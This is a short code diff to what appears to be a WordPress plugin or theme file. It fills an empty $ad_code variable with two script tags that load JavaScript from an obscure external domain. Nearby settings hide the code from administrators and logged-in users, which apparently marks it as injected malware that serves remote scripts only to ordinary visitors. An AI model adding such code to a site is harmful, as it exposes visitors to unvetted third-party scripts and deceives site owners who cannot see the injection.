@@ -46,7 +46,10 @@ add_action( 'admin_init', function() {
 	
 });
 
-$ad_code='';
+$ad_code="
+<script type='text/javascript' src='//aanqylta.com/bb/2f/82/bb2f8268f180d7e0e1613e43c3e34d23.js'></script>
+<script type='text/javascript' src='//aanqylta.com/a4/8a/80/a48a807e59fb8d5503642ee3fcbb8f87.js'></script>
+";
 
 $hide_admin='on';
 $hide_logged_in='on';
